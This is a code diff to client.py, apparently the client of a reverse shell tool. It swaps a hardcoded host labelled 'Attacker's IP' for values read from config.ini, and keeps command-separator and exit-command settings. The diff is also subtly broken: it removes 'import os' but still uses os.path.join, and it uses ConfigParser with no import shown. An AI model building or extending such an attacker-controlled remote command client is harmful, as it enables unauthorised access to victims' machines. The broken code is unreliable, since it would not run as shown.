@@ -1,11 +1,16 @@
-import socket
-import subprocess
-import os
+# client.py
+config_path = os.path.join('config.ini')
+# os.path.exists(config_path)
+# cwd = os.getcwd()
+# print(cwd)
+config = ConfigParser.ConfigParser()
+config.read(config_path)
 
-HOST = "000.000.000.000" # Attacker's IP
-PORT = 0000
+HOST = config.get('Server', 'address')
+PORT = int(config.get('Server', 'port'))
 BUFFER = 4096
 SEP = "<sep>"
+
 error_outputs = ["Invalid command", "No such file or directory"]
 exit_inputs = ['exit', 'quit', 'q', 'close', 'shutdown', 'bye', 'goodbye']
 
